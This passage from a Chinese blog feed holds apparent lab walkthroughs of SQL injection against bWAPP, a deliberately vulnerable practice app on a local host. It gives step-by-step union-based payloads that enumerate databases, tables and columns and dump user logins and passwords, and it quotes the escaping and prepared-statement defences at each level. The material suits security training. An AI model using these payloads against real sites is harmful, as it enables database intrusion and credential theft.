class="keyword">if</span>(mysql_num_rows($recordset) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>($row = mysql_fetch_array($recordset))</span><br><span class="line">        &#123;</span><br><span class="line">            $movies[] = $row;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $movies = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $movies = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.w3school.com.cn/jquery/ajax_getjson.asp" target="_blank" rel="noopener">getJSON</a></p>
<h2 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><ol>
<li><p>判断是否存在注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' and 1=1 <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195015337.png" alt="image-20200921195015337"></p>
</li>
<li><p>判断注入字段个数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' order by 7 <span class="comment">#</span></span><br><span class="line">a%' order by 8 <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195205297.png" alt="image-20200921195205297"></p>
<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195218407.png" alt="image-20200921195218407"></p>
</li>
<li><p>判断注入字段位置</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195316105.png" alt="image-20200921195316105"></p>
</li>
<li><p>获取数据库信息</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">version</span>(),<span class="keyword">user</span>(),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195347434.png" alt="image-20200921195347434"></p>
</li>
<li><p>获取表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195541640.png" alt="image-20200921195541640"></p>
</li>
<li><p>获取列名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195749587.png" alt="image-20200921195749587"></p>
</li>
<li><p>获取信息</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>,<span class="string">'-'</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195833856.png" alt="image-20200921195833856"></p>
</li>
</ol>
<h3 id="mid-high"><a href="#mid-high" class="headerlink" title="mid/high"></a>mid/high</h3><p>分别用了addslashes()和mysql_real_escape_string()函数防御</p>
<p>查看mysql编码, 如果是GBK编码且操作系统是UTF-8编码, 则可以用宽字节来绕过:</p>
<p>可惜mysql编码是utf-8:</p>
]]></content>
  </entry>
  <entry>
    <title>bWAPP-SQLInjectionPost2</title>
    <url>/2020/09/20/bWAPP-SQLInjectionPost2/</url>
    <content><![CDATA[<h1 id="POST整型注入"><a href="#POST整型注入" class="headerlink" title="POST整型注入"></a>POST整型注入</h1><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1+and+1=1<span class="comment">#</span></span><br><span class="line">1+and+1=2<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost2/image-20200920200958767.png" alt="image-20200920200958767"></p>
<p><img src="/2020/09/20/bWAPP-SQLInjectionPost2/image-20200920201107744.png" alt="image-20200920201107744"></p>
<h2 id="判断注入字段个数"><a href="#判断注入字段个数" class="headerlink" title="判断注入字段个数"></a>判断注入字段个数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1+order+by+7<span class="comment">#</span></span><br><span class="line">1+order+by+8<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost2/image-20200920201417450.png" alt="image-20200920201417450"></p>
<p><img src="/2020/09/20/bWAPP-SQLInjectionPost2/image-20200920201513205.png" alt="image-20200920201513205"></p>
<h2 id="判断注入字段位置"><a href="#判断注入字段位置" class="headerlink" title="判断注入字段位置"></a>判断注入字段位置</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost2/image-20200920201737205.png" alt="image-20200920201737205"></p>
<h2 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">version</span>(),<span class="keyword">user</span>(),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost2/image-20200920201850572.png" alt="image-20200920201850572"></p>
<h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0+union+<span class="keyword">select</span>+<span class="number">1</span>,(<span class="keyword">select</span>+<span class="keyword">group_concat</span>(table_name)+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost2/image-20200920202127462.png" alt="image-20200920202127462"></p>
<h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0+union+<span class="keyword">select</span>+<span class="number">1</span>,(<span class="keyword">select</span>+<span class="keyword">group_concat</span>(column_name)+<span class="keyword">from</span>+information_schema.columns+<span class="keyword">where</span>+table_name=<span class="string">'users'</span>+<span class="keyword">and</span>+table_schema=<span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost2/image-20200920202407401.png" alt="image-20200920202407401"></p>
<h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0+union+<span class="keyword">select</span>+<span class="number">1</span>,(<span class="keyword">select</span>+<span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>,<span class="string">'-'</span>)+<span class="keyword">from</span>+<span class="keyword">users</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost2/image-20200920202533712.png" alt="image-20200920202533712"></p>
<h1 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0+union+<span class="keyword">select</span>+<span class="number">1</span>,(<span class="keyword">select</span>+<span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>,<span class="string">'-'</span>)+<span class="keyword">from</span>+<span class="keyword">users</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost2/image-20200920202633513.png" alt="image-20200920202633513"></p>
<h2 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h2><p>使用mysql_real_escape_string</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli_check_2</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> mysql_real_escape_string($data);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>使用预处理语句防止注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id = $_POST[<span class="string">"movie"</span>];</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT title, release_year, genre, main_character, imdb FROM movies WHERE id =?"</span>;</span><br><span class="line"><span class="keyword">if</span>($stmt = $link-&gt;prepare($sql)) </span><br><span class="line"><span class="comment">// if($stmt = mysqli_prepare($link, $sql))                </span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Binds the parameters for markers</span></span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">"s"</span>, $id);</span><br><span class="line">    <span class="comment">// mysqli_stmt_bind_param($stmt, "s", $id);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Executes the query</span></span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    <span class="comment">// mysqli_stmt_execute($stmt);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Binds the result variables</span></span><br><span class="line">    $stmt-&gt;bind_result($title, $release_year, $genre, $main_character, $imdb);</span><br><span class="line">    <span class="comment">// mysqli_stmt_bind_result($stmt, $title, $release_year, $genre, $main_character, $imdb);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Stores the result, necessary to count the number of rows</span></span><br><span class="line">    $stmt-&gt;store_result();      </span><br><span class="line">    <span class="comment">// mysqli_stmt_store_result($stmt);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prints the number of rows</span></span><br><span class="line">    <span class="comment">// printf("Number of rows: %d.\n", mysqli_stmt_num_rows($stmt));</span></span><br><span class="line">    <span class="comment">// printf("Number of rows: %d.\n", $stmt-&gt;num_rows);      </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>bWAPP-SQLInjectionPost1</title>
    <url>/2020/09/20/bWAPP-SQLInjectionPost1/</url>
    <content><![CDATA[<h1 id="POST-字符型注入"><a href="#POST-字符型注入" class="headerlink" title="POST 字符型注入"></a>POST 字符型注入</h1><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">'</span><br><span class="line">' and 1=1 <span class="comment">#</span></span><br><span class="line">' and 1=2 <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost1/image-20200920194247140.png" alt="image-20200920194247140"></p>
<p><img src="/2020/09/20/bWAPP-SQLInjectionPost1/image-20200920194411381.png" alt="image-20200920194411381"></p>
<p><img src="/2020/09/20/bWAPP-SQLInjectionPost1/image-20200920194439170.png" alt="image-20200920194439170"></p>
<h2 id="判断注入字段个数"><a href="#判断注入字段个数" class="headerlink" title="判断注入字段个数"></a>判断注入字段个数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' order by 7 <span class="comment">#</span></span><br><span class="line">' order by 8 <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost1/image-20200920194648807.png" alt="image-20200920194648807"></p>
<p><img src="/2020/09/20/bWAPP-SQLInjectionPost1/image-20200920194709615.png" alt="image-20200920194709615"></p>
<h2 id="判断注入字段位置"><a href="#判断注入字段位置" class="headerlink" title="判断注入字段位置"></a>判断注入字段位置</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">10</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost1/image-20200920194825183.png" alt="image-20200920194825183"></p>
<h2 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">version</span>(),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">10</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost1/image-20200920195009948.png" alt="image-20200920195009948"></p>
<h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),version(),4,5,6,7 limit 10,1#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost1/image-20200920195216796.png" alt="image-20200920195216796"></p>
<h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>()),<span class="keyword">version</span>(),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">10</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost1/image-20200920195333622.png" alt="image-20200920195333622"></p>
<h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>,<span class="string">'-'</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="keyword">version</span>(),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">10</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/20/bWAPP-SQLInjectionPost1/image-20200920195444839.png" alt="image-20200920195444839"></p>
<h2 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>,<span class="string">'-'</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="keyword">version</span>(),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">10</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h3><p>不大可能绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli_check_1</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">    <span class="comment">// 语法 addslashes ( string $str ) : string</span></span><br><span class="line">    <span class="comment">// 返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。</span></span><br><span class="line">    <span class="comment">// 这些字符是单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>无法绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli_check_2</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> mysql_real_escape_string($data);</span><br><span class="line">    <span class="comment">// 面向对象风格</span></span><br><span class="line">    <span class="comment">// mysqli::escape_string ( string $escapestr ) : string</span></span><br><span class="line">    <span class="comment">// mysqli::real_escape_string ( string $escapestr ) : string</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 过程化风格</span></span><br><span class="line">    <span class="comment">// mysqli_real_escape_string ( mysqli $link , string $escapestr ) : string</span></span><br><span class="line">    <span class="comment">// 此函数用来对字符串中的特殊字符进行转义， 以使得这个字符串是一个合法的 SQL 语句。</span></span><br><span class="line">    <span class="comment">// 传入的字符串会根据当前连接的字符集进行转义，得到一个编码后的合法的 SQL 语句。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>bWAPP-SQLInjection2</title>
    <url>/2020/09/19/bWAPP-SQLInjection2/</url>
    <content><![CDATA[<h1 id="整型注入"><a href="#整型注入" class="headerlink" title="整型注入"></a>整型注入</h1><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><h3 id="寻找注入点，判断是否存在注入"><a href="#寻找注入点，判断是否存在注入" class="headerlink" title="寻找注入点，判断是否存在注入"></a>寻找注入点，判断是否存在注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and 1=1 <span class="comment">#</span></span><br><span class="line"><span class="comment">#正常回显</span></span><br><span class="line">1 and 1=2 <span class="comment">#</span></span><br><span class="line"><span class="comment">#错误回显</span></span><br><span class="line"><span class="comment">#则存在注入</span></span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=100+or+1=1<span class="comment">#&amp;action=go</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/19/bWAPP-SQLInjection2/1.png" alt="1"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">192.168.80.2/sqli_2.php?movie=1+and+1=1<span class="comment">#&amp;action=go</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/19/bWAPP-SQLInjection2/2.png" alt="2"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">192.168.80.2/sqli_2.php?movie=1+and+1=2<span class="comment">#&amp;action=go</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/19/bWAPP-SQLInjection2/3.png" alt="3"></p>
<h3 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 order by 7 <span class="comment">#</span></span><br><span class="line"><span class="comment">--正常回显</span></span><br><span class="line">1 order by 8 <span class="comment">#</span></span><br><span class="line"><span class="comment">--錯誤回显</span></span><br></pre></td></tr></table></figure>



<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">192.168.80.2/sqli_2.php?movie=1+order+by+7#&amp;action=go</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/19/bWAPP-SQLInjection2/5.png" alt="5"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">192.168.80.2/sqli_2.php?movie=1+order+by+8#&amp;action=go</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/19/bWAPP-SQLInjection2/4.png" alt="4"></p>
<h3 id="判断可注入字段位置"><a href="#判断可注入字段位置" class="headerlink" title="判断可注入字段位置"></a>判断可注入字段位置</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="comment">#</span></span><br><span class="line"><span class="comment">-- union 当前面对为false时执行union后面的语句,故选用0，不存在的字符</span></span><br></pre></td></tr></table></figure>



<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+select+1,2,3,4,5,6,7#&amp;action=go</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/19/bWAPP-SQLInjection2/6.png" alt="6"></p>
<h3 id="使用内置函数查看数据库信息"><a href="#使用内置函数查看数据库信息" class="headerlink" title="使用内置函数查看数据库信息"></a>使用内置函数查看数据库信息</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">database();\version();\user()..</span><br></pre></td></tr></table></figure>



<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+select+1,database(),version(),user(),5,6,7#&amp;action=go</span><br></pre></td></tr></table></figure>

<p> <img src="/2020/09/19/bWAPP-SQLInjection2/7.png" alt="7"></p>
<h3 id="查看表名"><a href="#查看表名" class="headerlink" title="查看表名"></a>查看表名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>

<p><strong>使用 <code>group_concat()</code>函数把获取的表拼接成字符串，方便查看。</strong></p>
<p><strong>使用 <code>where table_schema=database()</code>指定当前数据库的表，避免获取全部表，导致获取的表数量过多，无法显示完整</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()<span class="comment">#&amp;action=go</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/19/bWAPP-SQLInjection2/8.png" alt="8"></p>
<h3 id="获取表字段名"><a href="#获取表字段名" class="headerlink" title="获取表字段名"></a>获取表字段名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>+<span class="keyword">from</span>+information_schema.columns+<span class="keyword">where</span>+table_name=<span class="string">"users"</span>+<span class="keyword">and</span>+table_schema=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>+<span class="keyword">from</span>+information_schema.columns+<span class="keyword">where</span>+table_name=<span class="string">"users"</span>+<span class="keyword">and</span>+table_schema=<span class="keyword">database</span>()<span class="comment">#&amp;action=go</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/19/bWAPP-SQLInjection2/9.png" alt="9"></p>
<h3 id="提权相关信息"><a href="#提权相关信息" class="headerlink" title="提权相关信息"></a>提权相关信息</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+<span class="keyword">select</span>+<span class="number">1</span>,login,<span class="keyword">password</span>,secret,email,<span class="number">6</span>,<span class="number">7</span>+<span class="keyword">from</span>+<span class="keyword">users</span><span class="comment">#&amp;action=go</span></span><br><span class="line"><span class="comment">--只能显示一行</span></span><br><span class="line"><span class="comment">--可通过 limit 进行逐个提取</span></span><br><span class="line"><span class="comment">--http://192.168.80.2/sqli_2.php?movie=0+union+select+1,login,password,secret,email,6,7+from+users limit 1,1#&amp;action=go</span></span><br></pre></td></tr></table></figure>

<p>limit 可接收一个或两个整型参数</p>
<ol>
<li><p>接收一个参数</p>
<p><code>SELECT * FROM table LIMIT 5;   //检索前5个记录行 换句话说，LIMIT n 等价于 LIMIT 0,n。</code></p>
</li>
<li><p>接收两个参数（第一位表示从第几行开始偏移，第二位表示偏移最大数目）</p>
<p> <code>SELECT * FROM table LIMIT 5,10; // 检索记录行 6-15</code></p>
</li>
</ol>
<p><a href="http://www.phpweblog.net/peiyinjin/archive/2008/04/15/3199.html" target="_blank" rel="noopener">limit的用法</a></p>
<p><img src="/2020/09/19/bWAPP-SQLInjection2/10.png" alt="10"></p>
<p>也可通过group_concat进行拼接输出</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>,<span class="string">'-'</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/19/bWAPP-SQLInjection2/11.png" alt="11"></p>
<h2 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>,<span class="string">'-'</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h3><p>使用<code>addslashes();</code>函数进行过滤。受影响字符单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）。</p>
<p><strong>但是整型注入不受影响（不存在  ‘ 闭合的问题，故不受影响）</strong></p>
